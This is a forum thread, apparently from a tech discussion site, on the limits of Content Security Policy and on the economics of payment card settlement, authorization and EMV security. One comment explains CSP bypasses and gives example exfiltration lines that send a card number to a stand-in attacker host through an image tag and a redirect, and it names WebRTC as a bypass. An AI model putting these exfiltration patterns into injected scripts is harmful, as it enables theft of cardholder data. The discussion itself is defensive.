c0nrad · Nov 28, 2026

Not particularly. CSP is good at preventing execution (XSS), but once there is execution it's not the best at preventing exfiltration.

If an attacker is able to inject/modify an existing script file (or add allowed script files for ads), CSP can't help (unless you're using hashes, but those can be brittle).

Preventing exfil is very hard with CSP. Any "real world" policy will have need to require open'ish directives (img-src https:, etc), which will allow trivial exfil (<img src='https://exil.com?cc=1234'</>). Redirects (window.location = "https://exfil.com?cc=1234") also go around CSP. There's many CTF challenges related to these bypasses.

WebRTC is particularly difficult to stop too, and the webrtc directive isn't widely adopted yet. It's commonly used as a global CSP bypass since it doens't call under connect-src (and can't). * https://www.youtube.com/watch?v=sAmJ3Ypbosw

So this needs to be stopped at the injection point.

(edit: I guess one could argue for monitoring with report-hash, but it seems unlikey for companies to detect and read every change to 3rd party scripts).

(Founder of csper.io)

One important thing to understand about payment cards in particular is the distinction between "Settlement" and "Authorisation"

Settlement is the process by which Bank A with your money, or possibly your debt if it's a credit card, gives money to Bank B representing a merchant where ostensibly you paid with the payment card.

Settlement is basically still the same "Honour System" process as it was last century, it's probably no longer literally magnetic tapes or punched cards, but cryptography has no real role here. Because this relies on that Honour System, mere accidents can result in transactions which should not exist. At a societal level e.g. a big bank mistakenly runs MAIN1 MAIN2 MAIN2 MAIN4 files through their settlement process one night, and the next morning people whose transactions were in MAIN2 realise they've been charged twice! Meanwhile retailers relying on MAIN3 being processed are distraught to find that magically they got nothing. Oops, fat finger. e.g.

https://www.bbc.co.uk/news/uk-england-45400234 https://www.bbc.co.uk/news/business-41061781

Authorization is the step where there's something resembling modern security. This step is there to protect Banks and Merchants from Customers, who they don't trust as far as they could throw you. Although Banks and Merchants are so often involved in fraud, they both love blaming Customers and so hence they require Authorization. The EMV technology (most familiar as "Chip and PIN" but the same technology makes Contactless including paying with your iPhone work in most countries) is the most "high tech" this ever got.

EMV could be fairly good. It's not really well designed, crypto people have found some serious holes in it, but they're at the scale of "Skilled people could break this" or "This is needlessly worse than it should be" not at the "A bored teenager can steal your money" level where the magnetic stripes were. However, the bank cares a lot about price, a best-in-class EMV card might cost $1 more, if it reduces the bank's fraud costs by 50 cents they are losing money on that, so the crap EMV card they gave you is the right choice for their bottom line even if you also lose on average $2.50 from the fraud, the bank doesn't care about you, your benefit does not appear on their bottom line.

Understanding, as so often, Cui Bono (who benefits) from Authorization clarifies where the incentives are.

lxgr · Nov 27, 2026

You probably mean cardholder authentication, not authorization. Authorization in the cards space means checking with the card issuer if the card has sufficient funds, but the cardholder identity is usually not verified here (except if maybe a PIN is entered, but even that can happen at a different stage). Even magnetic stripe cards have been commonly authorized online decades before EMV became a thing.

Also, the idea that "better EMV cards yield better security" is outdated by at least a decade and was only really relevant before ubiquitous online transaction authorization (at which point both "cheap" and "expensive" EMV cards can be verified for being clones). These days, essentially all cards support asymmetric cryptography, i.e. are the "expensive type of card", and are secure against clones even when the terminal is offline (assuming the issuer even wants to support that type of transaction, since it involves some risk to them).

The main difference is whether they support a PIN or whether a signature is sufficient, but that's mainly driven by market considerations, not individual issuers' fraud tradeoffs.

I think it's rather a collective action problem: If all issuers were to make card payments just a little bit more secure (and in the process less convenient too), consumers would have no choice but adapt. But since it's in each issuer's individual interest to keep that dial just a liiitle bit more to the "convenient but insecure" position than their competitors, the only equilibrium ends up being everybody approving as much fraud as they can accept. A very similar consideration applies on the merchant side.

Unregulated markets do often produce optimal solutions, but that doesn't mean that literally every solution they produce is also optimal.

> I suspect that the people who could change this are more interested in continued treatment than cure.

Regulators could fix it by mandating security (and thereby keeping the playing field level), in the way that e.g. the EU largely solved this problem (at least for intra-EU payments; unfortunately compromised EU cards can still be readily used at US online merchants), but I have a feeling that in the US, there isn't really political will for that.
